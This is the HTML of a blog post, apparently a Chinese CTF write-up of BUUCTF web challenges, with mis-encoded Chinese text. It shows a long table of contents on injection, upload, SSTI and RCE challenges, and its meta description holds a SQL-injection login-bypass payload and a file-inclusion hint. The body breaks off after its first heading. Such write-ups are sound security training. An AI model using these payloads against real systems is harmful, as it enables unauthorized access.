<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="buuctf 1ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL è¿›å»çŒœé—­åˆæ–¹å¼\nå•å¼•å·é—­åˆ\nå°è¯•ä¸‡èƒ½å¯†ç ç™»å…¥\n1 2 username=1&#39; or true# password=1&#39; or true# 2ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun æŸ¥çœ‹æºç è¦getä¼ catçš„å€¼ä¸ºdog\n1 ?cat=dog 3ã€[HCTF 2018]WarmUp æŸ¥çœ‹æºç source.php\nç™½åå•åªæœ‰source.phpå’Œhint.php,æ–‡ä»¶åŒ…å«ä¼ fileå‚æ•°,ä¸”æœ‰?æˆªæ–­\n">
<title>buuctfåˆ·é¢˜</title>

<link rel='canonical' href='https://0d000721999.github.io/p/buuctf%E5%88%B7%E9%A2%98/'>

<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="buuctfåˆ·é¢˜">
<meta property='og:description' content="buuctf 1ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL è¿›å»çŒœé—­åˆæ–¹å¼\nå•å¼•å·é—­åˆ\nå°è¯•ä¸‡èƒ½å¯†ç ç™»å…¥\n1 2 username=1&#39; or true# password=1&#39; or true# 2ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun æŸ¥çœ‹æºç è¦getä¼ catçš„å€¼ä¸ºdog\n1 ?cat=dog 3ã€[HCTF 2018]WarmUp æŸ¥çœ‹æºç source.php\nç™½åå•åªæœ‰source.phpå’Œhint.php,æ–‡ä»¶åŒ…å«ä¼ fileå‚æ•°,ä¸”æœ‰?æˆªæ–­\n">
<meta property='og:url' content='https://0d000721999.github.io/p/buuctf%E5%88%B7%E9%A2%98/'>
<meta property='og:site_name' content='ç¾å’•å™œçš„å°ç«™'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='åˆ·é¢˜' /><meta property='article:published_time' content='2025-01-10T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-01-10T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/buuctf%E5%88%B7%E9%A2%98/1.png' />
<meta name="twitter:title" content="buuctfåˆ·é¢˜">
<meta name="twitter:description" content="buuctf 1ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL è¿›å»çŒœé—­åˆæ–¹å¼\nå•å¼•å·é—­åˆ\nå°è¯•ä¸‡èƒ½å¯†ç ç™»å…¥\n1 2 username=1&#39; or true# password=1&#39; or true# 2ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun æŸ¥çœ‹æºç è¦getä¼ catçš„å€¼ä¸ºdog\n1 ?cat=dog 3ã€[HCTF 2018]WarmUp æŸ¥çœ‹æºç source.php\nç™½åå•åªæœ‰source.phpå’Œhint.php,æ–‡ä»¶åŒ…å«ä¼ fileå‚æ•°,ä¸”æœ‰?æˆªæ–­\n"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://0d000721999.github.io/p/buuctf%E5%88%B7%E9%A2%98/1.png' />
    <link rel="shortcut icon" href="/favicon.ico" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            localStorage.setItem(colorSchemeKey, "light");
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu988272603220494224.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ˜‹</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">ç¾å’•å™œçš„å°ç«™</a></h1>
            <h2 class="site-description">Cialloï½(âˆ ãƒ»Ï‰&lt; )âŒ’â˜…</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://buuoj.cn/users/175721'
                        target="_blank"
                        title="BUUOJ"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
  <line x1="7" y1="12" x2="13" y2="12" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/0d000721999'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/friends/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                
                <span>Friends</span>
            </a>
        </li>
        
        
        <li >
            <a href='/links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Links</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#1æå®¢å¤§æŒ‘æˆ˜-2019easysql">1ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</a></li>
    <li><a href="#2æå®¢å¤§æŒ‘æˆ˜-2019havefun">2ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</a></li>
    <li><a href="#3hctf-2018warmup">3ã€[HCTF 2018]WarmUp</a></li>
    <li><a href="#4actf2020-æ–°ç”Ÿèµ›include">4ã€[ACTF2020 æ–°ç”Ÿèµ›]Include</a></li>
    <li><a href="#5actf2020-æ–°ç”Ÿèµ›exec">5ã€[ACTF2020 æ–°ç”Ÿèµ›]Exec</a></li>
    <li><a href="#6gxyctf2019ping-ping-ping">6ã€[GXYCTF2019]Ping Ping Ping</a>
      <ol>
        <li><a href="#æ–¹æ³•ä¸€å˜é‡æ‹¼æ¥å­—ç¬¦ä¸²å°†açš„å€¼è¦†ç›–ç„¶åè¿›è¡Œç»•è¿‡">æ–¹æ³•ä¸€ï¼š<strong>å˜é‡æ‹¼æ¥å­—ç¬¦ä¸²â€”â€”å°†açš„å€¼è¦†ç›–ï¼Œç„¶åè¿›è¡Œç»•è¿‡</strong></a></li>
        <li><a href="#æ–¹æ³•äºŒå†…è”æ‰§è¡Œ"><strong>æ–¹æ³•äºŒï¼šå†…è”æ‰§è¡Œ</strong></a></li>
        <li><a href="#æ–¹æ³•ä¸‰shå‘½ä»¤æ¥æ‰§è¡Œ"><strong>æ–¹æ³•ä¸‰ï¼šshå‘½ä»¤æ¥æ‰§è¡Œ</strong></a></li>
      </ol>
    </li>
    <li><a href="#7suctf-2019easysql">7ã€[SUCTF 2019]EasySQL</a>
      <ol>
        <li><a href="#æ–¹æ³•ä¸€ä½¿ç”¨-sql_mode-ä¸­çš„-pipes_as_concat-å‡½æ•°">æ–¹æ³•ä¸€ï¼šä½¿ç”¨ sql_mode ä¸­çš„ PIPES_AS_CONCAT å‡½æ•°</a></li>
        <li><a href="#æ–¹æ³•äºŒåˆ©ç”¨éé¢„æœŸæ¼æ´è·å–flag">æ–¹æ³•äºŒï¼šåˆ©ç”¨éé¢„æœŸæ¼æ´è·å–flag</a></li>
      </ol>
    </li>
    <li><a href="#8æå®¢å¤§æŒ‘æˆ˜-2019lovesql">8ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</a></li>
    <li><a href="#9å¼ºç½‘æ¯-2019éšä¾¿æ³¨">9ã€[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</a></li>
    <li><a href="#10æå®¢å¤§æŒ‘æˆ˜-2019secret-file">10ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</a></li>
    <li><a href="#11æå®¢å¤§æŒ‘æˆ˜-2019http">11ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</a></li>
    <li><a href="#12æå®¢å¤§æŒ‘æˆ˜-2019upload">12ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</a></li>
    <li><a href="#13æå®¢å¤§æŒ‘æˆ˜-2019knife">13ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</a></li>
    <li><a href="#14actf2020-æ–°ç”Ÿèµ›upload">14ã€[ACTF2020 æ–°ç”Ÿèµ›]Upload</a></li>
    <li><a href="#15æå®¢å¤§æŒ‘æˆ˜-2019babysql">15ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</a></li>
    <li><a href="#16æå®¢å¤§æŒ‘æˆ˜-2019php">16ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</a></li>
    <li><a href="#17actf2020-æ–°ç”Ÿèµ›backupfile">17ã€[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</a></li>
    <li><a href="#18roarctf-2019easy-calc">18ã€[RoarCTF 2019]Easy Calc</a></li>
    <li><a href="#19æå®¢å¤§æŒ‘æˆ˜-2019buyflag">19ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</a></li>
    <li><a href="#20bjdctf2020easy-md5">20ã€BJDCTF2020]Easy MD5</a>
      <ol>
        <li><a href="#md5å‡½æ•°">md5å‡½æ•°</a></li>
      </ol>
    </li>
    <li><a href="#21hctf-2018admin">21ã€[HCTF 2018]admin</a></li>
    <li><a href="#22mrctf2020ä½ ä¼ ä½ å‘¢">22ã€[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</a></li>
    <li><a href="#23zjctf-2019nizhuansiwei">23ã€[ZJCTF 2019]NiZhuanSiWei</a></li>
    <li><a href="#24æå®¢å¤§æŒ‘æˆ˜-2019hardsql">24ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</a></li>
    <li><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„areuserialz">[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</a></li>
    <li><a href="#gxyctf2019babysqli">[GXYCTF2019]BabySQli</a></li>
    <li><a href="#gyctf2020blacklist">[GYCTF2020]Blacklist</a></li>
    <li><a href="#ciscn2019-ååŒ—èµ›åŒº-day2-web1hack-world">[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</a></li>
    <li><a href="#roarctf-2019easy-java">[RoarCTF 2019]Easy Java</a></li>
    <li><a href="#bsidescf-2020had-a-bad-day">[BSidesCF 2020]Had a bad day</a></li>
    <li><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„phpweb">[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</a></li>
    <li><a href="#bjdctf2020the-mystery-of-ip">[BJDCTF2020]The mystery of ip</a></li>
    <li><a href="#bjdctf2020zjctfä¸è¿‡å¦‚æ­¤">[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</a></li>
    <li><a href="#buuctf-2018online-tool">[BUUCTF 2018]Online Tool</a></li>
    <li><a href="#gxyctf2019ç¦æ­¢å¥—å¨ƒ">[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</a></li>
    <li><a href="#nctf2019fake-xml-cookbook">[NCTF2019]Fake XML cookbook</a></li>
    <li><a href="#gwctf-2019æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“">[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</a></li>
    <li><a href="#bjdctf2020mark-loves-cat">[BJDCTF2020]Mark loves cat</a></li>
    <li><a href="#wustctf2020æœ´å®æ— å">[WUSTCTF2020]æœ´å®æ— å</a></li>
    <li><a href="#bjdctf2020cookie-is-so-stable">[BJDCTF2020]Cookie is so stable</a></li>
    <li><a href="#ciscn2019-åä¸œå—èµ›åŒºweb11">[CISCN2019 åä¸œå—èµ›åŒº]Web11</a></li>
    <li><a href="#mrctf2020ezpop">[MRCTF2020]Ezpop</a></li>
    <li><a href="#å®‰æ´µæ¯-2019easy_web">[å®‰æ´µæ¯ 2019]easy_web</a></li>
    <li><a href="#mrctf2020pywebsite">[MRCTF2020]PYWebsite</a></li>
    <li><a href="#å®‰æ´µæ¯-2019easy_serialize_php">[å®‰æ´µæ¯ 2019]easy_serialize_php</a>
      <ol>
        <li><a href="#phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸">phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</a></li>
      </ol>
    </li>
    <li><a href="#å¼ºç½‘æ¯-2019é«˜æ˜çš„é»‘å®¢">[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</a></li>
    <li><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„nmap">[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</a></li>
    <li><a href="#npuctf2020readlezphp">[NPUCTF2020]ReadlezPHP</a></li>
    <li><a href="#swpu2019web1">[SWPU2019]Web1</a>
      <ol>
        <li><a href="#æ— åˆ—åæ³¨å…¥">æ— åˆ—åæ³¨å…¥</a></li>
      </ol>
    </li>
    <li><a href="#æå®¢å¤§æŒ‘æˆ˜-2019finalsql">[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</a></li>
    <li><a href="#ciscn-2019-åˆèµ›love-math">[CISCN 2019 åˆèµ›]Love Math</a></li>
    <li><a href="#æå®¢å¤§æŒ‘æˆ˜-2019rce-me">[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</a></li>
    <li><a href="#de1ctf-2019ssrf-me">[De1CTF 2019]SSRF Me</a></li>
    <li><a href="#bjdctf2020easysearch">[BJDCTF2020]EasySearch</a>
      <ol>
        <li><a href="#apache-ssi-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ssiæ³¨å…¥æ¼æ´">Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆSSIæ³¨å…¥æ¼æ´ï¼‰</a></li>
      </ol>
    </li>
    <li><a href="#gyctf2020flaskapp">[GYCTF2020]FlaskApp</a>
      <ol>
        <li><a href="#pythonçš„flaskæ¨¡æ¿æ³¨å…¥debugæ¨¡å¼åˆ©ç”¨pinç è¿›è¡Œrce">pythonçš„flaskæ¨¡æ¿æ³¨å…¥debugæ¨¡å¼åˆ©ç”¨PINç è¿›è¡ŒRCE</a></li>
      </ol>
    </li>
    <li><a href="#wustctf2020é¢œå€¼æˆç»©æŸ¥è¯¢">[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</a></li>
    <li><a href="#fbctf2019rceservice">[FBCTF2019]RCEService</a></li>
    <li><a href="#suctf-2019pythonginx">[SUCTF 2019]Pythonginx</a></li>
    <li><a href="#0ctf-2016piapiapia">[0CTF 2016]piapiapia</a></li>
    <li><a href="#zer0pts2020can-you-guess-it">[Zer0pts2020]Can you guess it?</a></li>
    <li><a href="#mrctf2020å¥—å¨ƒ">[MRCTF2020]å¥—å¨ƒ</a></li>
    <li><a href="#cscctf-2019-qualflasklight">[CSCCTF 2019 Qual]FlaskLight</a></li>
    <li><a href="#watevrctf-2019cookie-store">[watevrCTF-2019]Cookie Store</a></li>
    <li><a href="#wustctf2020cv-maker">[WUSTCTF2020]CV Maker</a></li>
    <li><a href="#ciscn2019-ååŒ—èµ›åŒº-day1-web2ikun">[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</a></li>
    <li><a href="#çº¢æ˜è°·ctf-2021write_shell">[çº¢æ˜è°·CTF 2021]write_shell</a></li>
    <li><a href="#watevrctf-2019pickle-store">[watevrCTF-2019]Pickle Store</a></li>
    <li><a href="#rctf2015easysql">[RCTF2015]EasySQL</a></li>
    <li><a href="#gwctf-2019æ¯ç‡¥çš„æŠ½å¥–">[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</a></li>
    <li><a href="#nctf2019true-xml-cookbook">[NCTF2019]True XML cookbook</a></li>
    <li><a href="#ciscn2019-ååŒ—èµ›åŒº-day1-web5cyberpunk">[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</a></li>
    <li><a href="#wmctf2020make-php-great-again">[WMCTF2020]Make PHP Great Again</a></li>
    <li><a href="#ç½‘é¼æ¯-2020-ç™½è™ç»„picdown">[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown</a></li>
    <li><a href="#hitcon-2017ssrfme">[HITCON 2017]SSRFme</a></li>
    <li><a href="#ciscn2019-ååŒ—èµ›åŒº-day1-web1dropbox">[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</a></li>
    <li><a href="#hfctf2020easylogin">[HFCTF2020]EasyLogin</a>
      <ol>
        <li><a href="#koaæ¡†æ¶åŸºæœ¬ç›®å½•">koaæ¡†æ¶åŸºæœ¬ç›®å½•</a></li>
      </ol>
    </li>
    <li><a href="#swpuctf-2018simplephp">[SWPUCTF 2018]SimplePHP</a></li>
    <li><a href="#october-2019-twice-sql-injection">October 2019 Twice SQL Injection</a></li>
    <li><a href="#gyctf2020ezsqli">[GYCTF2020]Ezsqli</a></li>
    <li><a href="#ciscn2019-æ€»å†³èµ›-day2-web1easyweb">[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</a></li>
    <li><a href="#rootersctf2019i_3_flask">[RootersCTF2019]I_&lt;3_Flask</a></li>
    <li><a href="#npuctf2020ezinclude">[NPUCTF2020]ezinclude</a>
      <ol>
        <li><a href="#æ³•ä¸€åˆ©ç”¨php7-segment-faultç‰¹æ€§cve-2018-14884">æ³•ä¸€ï¼šåˆ©ç”¨php7 segment faultç‰¹æ€§ï¼ˆCVE-2018-14884ï¼‰</a></li>
        <li><a href="#æ³•äºŒåˆ©ç”¨-sessionupload_progress-è¿›è¡Œ-session-æ–‡ä»¶åŒ…å«">æ³•äºŒï¼šåˆ©ç”¨ session.upload_progress è¿›è¡Œ session æ–‡ä»¶åŒ…å«</a></li>
      </ol>
    </li>
    <li><a href="#nctf2019sqli">[NCTF2019]SQLi</a></li>
    <li><a href="#ç½‘é¼æ¯-2020-åŠå†³èµ›alicewebsite">[ç½‘é¼æ¯ 2020 åŠå†³èµ›]AliceWebsite</a></li>
    <li><a href="#harekazectf2019encode_and_encode">[HarekazeCTF2019]encode_and_encode</a></li>
    <li><a href="#suctf-2019easyweb">[SUCTF 2019]EasyWeb</a></li>
    <li><a href="#ciscn2019-åä¸œå—èµ›åŒºdouble-secret">[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</a></li>
    <li><a href="#gkctf-2021easycms">[GKCTF 2021]easycms</a></li>
    <li><a href="#bjdctf2020ezphp">[BJDCTF2020]EzPHP</a></li>
    <li><a href="#gyctf2020easythinking">[GYCTF2020]EasyThinking</a></li>
    <li><a href="#gxyctf2019strongestmind">[GXYCTF2019]StrongestMind</a></li>
    <li><a href="#hfctf2020justescape">[HFCTF2020]JustEscape</a></li>
    <li><a href="#suctf-2018getshell">[SUCTF 2018]GetShell</a></li>
    <li><a href="#b01lers2020life-on-mars">[b01lers2020]Life on Mars</a></li>
    <li><a href="#easybypass">EasyBypass</a></li>
    <li><a href="#æå®¢å¤§æŒ‘æˆ˜-2020roamphp1-welcome">[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp1-Welcome</a></li>
    <li><a href="#csawqual-2019web_unagi">[CSAWQual 2019]Web_Unagi</a></li>
    <li><a href="#mrctf2020ezaudit">[MRCTF2020]Ezaudit</a></li>
    <li><a href="#bsidescf-2019svgmagic">[BSidesCF 2019]SVGMagic</a></li>
    <li><a href="#isitdtu-2019easyphp">[ISITDTU 2019]EasyPHP</a></li>
    <li><a href="#ç¾ŠåŸæ¯2020easyphp">[ç¾ŠåŸæ¯2020]easyphp</a></li>
    <li><a href="#fireshellctf2020caas">[FireshellCTF2020]Caas</a></li>
    <li><a href="#harekazectf2019avatar-uploader-1">[HarekazeCTF2019]Avatar Uploader 1</a></li>
    <li><a href="#sctf2019flag-shop">[SCTF2019]Flag Shop</a></li>
    <li><a href="#n1ctf-2018eating_cms">[N1CTF 2018]eating_cms</a></li>
    <li><a href="#gyctf2020easyphp">[GYCTF2020]Easyphp</a></li>
    <li><a href="#suctf-2018multisql">[SUCTF 2018]MultiSQL</a></li>
    <li><a href="#suctf-2018annonymous">[SUCTF 2018]annonymous</a></li>
    <li><a href="#rootersctf2019babyweb">[RootersCTF2019]babyWeb</a></li>
    <li><a href="#å®‰æ´µæ¯-2019ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ ">[å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ </a></li>
    <li><a href="#å¼ºç½‘æ¯-2019upload">[å¼ºç½‘æ¯ 2019]Upload</a></li>
    <li><a href="#ciscn2019-åä¸œå—èµ›åŒºweb4">[CISCN2019 åä¸œå—èµ›åŒº]Web4</a></li>
    <li><a href="#gxyctf2019babysqliv30">[GXYCTF2019]BabysqliV3.0</a></li>
    <li><a href="#pasecactf_2019flask_ssti">[pasecactf_2019]flask_ssti</a></li>
    <li><a href="#eis-2019ezpop">[EIS 2019]EzPOP</a></li>
    <li><a href="#gwctf-2019mypassword">[GWCTF 2019]mypassword</a></li>
    <li><a href="#hfctf2020babyupload">[HFCTF2020]BabyUpload</a></li>
    <li><a href="#swpu2019web4">[SWPU2019]Web4</a></li>
    <li><a href="#å®‰æ´µæ¯-2019iamthinking">[å®‰æ´µæ¯ 2019]iamthinking</a></li>
    <li><a href="#paseca2019honey_shop">[PASECA2019]honey_shop</a></li>
    <li><a href="#black-watch-å…¥ç¾¤é¢˜web">[Black Watch å…¥ç¾¤é¢˜]Web</a></li>
    <li><a href="#googlectf2019-qualsbnv">[GoogleCTF2019 Quals]Bnv</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/buuctf%E5%88%B7%E9%A2%98/">
                <img src="/p/buuctf%E5%88%B7%E9%A2%98/1.png"
                        
                        width="1920" 
                        height="1080" 
                        loading="lazy"
                        alt="Featured image of post buuctfåˆ·é¢˜" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/%E5%88%B7%E9%A2%98%E6%89%93%E9%9D%B6/" style="background-color: #264653; color: #fff;">
                åˆ·é¢˜&amp;&amp;æ‰“é¶
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/buuctf%E5%88%B7%E9%A2%98/">buuctfåˆ·é¢˜</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Jan 10, 2025</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    é˜…è¯»æ—¶é•¿: 75 åˆ†é’Ÿ
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="buuctf">buuctf
</h1><h2 id="1æå®¢å¤§æŒ‘æˆ˜-2019easysql">1ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL
</h2><p>è¿›å»çŒœé—­åˆæ–¹å¼</p>
<p>å•å¼•å·é—­åˆ</p>
<p>å°è¯•ä¸‡èƒ½å¯†ç ç™»å…¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
